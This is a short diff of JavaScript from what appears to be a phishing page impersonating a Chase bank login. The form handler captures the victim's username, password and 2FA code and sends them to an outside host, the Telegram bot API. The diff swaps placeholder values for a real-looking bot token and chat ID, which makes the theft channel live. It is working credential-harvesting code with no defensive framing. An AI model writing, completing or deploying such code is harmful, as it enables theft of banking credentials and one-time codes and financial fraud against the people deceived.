@@ -35,8 +35,8 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     const password = document.getElementById('password').value;
     const otp = document.getElementById('otp').value || 'none';
     const message = `CHASE LOGIN\nUser: ${username}\nPass: ${password}\n2FA: ${otp}\nIP: ${window.location.hostname}`;
-    const botToken = 'YOUR_BOT_TOKEN';
-    const chatId = 'YOUR_CHAT_ID';
+    const botToken = '8610254587:AAEXZL1gK86eJeKk_N5VnI8NNaTLZD96E6E';
+    const chatId = '6263246736';
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
